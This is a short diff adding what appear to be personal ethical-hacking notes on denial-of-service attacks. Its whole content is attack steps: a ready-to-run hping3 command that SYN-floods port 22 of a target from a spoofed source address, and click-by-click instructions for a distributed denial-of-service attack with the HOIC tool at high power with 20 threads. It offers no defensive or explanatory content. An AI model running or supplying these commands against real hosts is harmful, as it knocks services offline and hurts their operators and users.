@@ -1,0 +1,9 @@
+###SYN Flooding a Target Host using hping3###
+
+hping3 -S <IP Address> -a <IP Of the attacker> -p 22 --flood
+*flooding port 22 with SYN packets and overloading vicitm resource. 
+
+###Performing Distributed Denail of Service Attack using HOIC###
+We add url to the "Target" url
+Power=High
+Add the target then add threads to 20. Then click "FIRE TEH LAZER!". 
